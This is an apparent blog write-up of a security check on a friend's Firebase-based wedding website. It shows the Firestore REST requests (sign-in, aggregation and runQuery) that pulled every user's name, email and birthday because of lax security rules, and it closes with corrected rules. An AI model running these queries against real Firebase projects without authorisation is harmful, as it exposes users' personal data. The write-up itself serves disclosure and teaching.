# The research goal
A friend of mine created a wedding website and I wanted to make sure it's secured.

# The research
## Requests inspections
Looking through the requests the website seems pretty well written- they use a lot of google APIs for their authentication and storage. So what could go wrong?

## The different requests
As every website, there're a lot of requests, but seems most of the logic was using Google APIs - auth and storage. Let's have some fun and research the Google APIs.

### login
request:
```
POST identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={{key}}

{
  "returnSecureToken": true,
  "email": "homigrotas@some.mail",
  "password": "testtest",
  "clientType": "CLIENT_TYPE_WEB"
}
```

response:
```json
{
	"error": {
		"code": 400,
		"message": "INVALID_LOGIN_CREDENTIALS",
		"errors": [
			{
				"message": "INVALID_LOGIN_CREDENTIALS",
				"domain": "global",
				"reason": "invalid"
			}
		]
	}
}
```

### storage
### Quick Intro: What is Firestore?
Firestore is a NoSQL database by Google that's part of Firebase. It’s designed for apps — fast, flexible, and scalable. It works great *if* it’s configured properly.

The key thing is that Firestore relies on **security rules** to control who can read and write data. If those rules aren’t set up right, any authenticated user might get access to data they shouldn’t.

### researching the app firestore
After I created a user and logged in, I saw a weird API call I wasn't familliar with in websites:


```
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:runAggregationQuery
```
Who doesn't want to query a DB? Certianly I LOVE!
<br>
So, first we would like to know which collections exist. Trying the following request
```
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:listCollectionIds
```

response:
```
{
  "error": {
    "code": 403,
    "message": "Missing or insufficient permissions.",
    "status": "PERMISSION_DENIED"
  }
}
```
well... maybe I wasn't so smart after all. They probably set permissions, and ofcourse I don't enough permissions to get all the project collection. Do I?

I saw I was able to change the aggergation query, so maybe I could make some quries?

request
```
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:runAggregationQuery\

{
  "structuredAggregationQuery": {
    "aggregations": [
      {
        "alias": "aggregate_0",
        "count": {}
      }
    ],
    "structuredQuery": {
      "from": [
        {
          "collectionId": "eventChats"
        }
      ]
    }
  }
}
```

response
```json
[{
  "result": {
    "aggregateFields": {
      "aggregate_0": {
        "integerValue": "0"
      }
    }
  },
  "readTime": "2025-08-01T15:34:01.251261Z"
}
]
```


Eventually, I found the following query using [firestore API documentation](https://cloud.google.com/firestore/docs/reference/rest/v1/projects.databases.documents/runQuery). Let's try to query possible collections. As we already know, we're familliar with one collection in the Firestore storage, but I didn't find it meaningful as we could scrape it. What about the website users?

```
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:runQuery

{
  "structuredQuery": {
    "from": [{ "collectionId": "users" }]
  
  }
}
```

And we got our desire- all the users!
```
[{
  "document": {
    "name": "projects/{{project_id}}/databases/(default)/documents/users/0vg....",
    "fields": {
      "firebaseUid": {
        "stringValue": "0vg...."
      },
      "name": {
        "stringValue": "...."
      },
      "email": {
        "stringValue": "...@gmail.com"
      },
      "profileImageUrl": {
        "stringValue": "..."
      },
      "birthday": {
        "stringValue": "1998-08-17"
      },
      "createdAt": {
        "timestampValue": "2025-07-21T16:44:44.075Z"
      },
      "updatedAt": {
        "timestampValue": "2025-07-21T16:44:44.075Z"
      }
    },
    "createTime": "2025-07-21T16:44:44.123596Z",
    "updateTime": "2025-07-21T16:44:44.123596Z"
  },
  "readTime": "2025-08-01T14:16:16.474399Z"
},
    ....
]
```
## So what went wrong?
The developers were using Firebase Auth — which is great — but they didn’t configure Firestore’s security rules properly. That meant any logged-in user could query collections like users, even if they weren’t supposed to.

## How to fix it
set Firestore rules correctly, such as in the following example:
```js
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Only allow users to read/write their own document
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // For eventChats, allow only logged-in users to read, or limit further
    match /eventChats/{chatId} {
      allow read: if request.auth != null;
      allow write: if false; // or restrict to specific roles
    }
  }
}
```

# Final Thoughts
When I saw the site was using Firebase, I figured it was probably fine. Turns out, the infrastructure was solid, but the rules were weak.

Moral of the story? Tools don’t make your app secure — you do. So test like an attacker and think like a developer.

Have fun exploring :) 

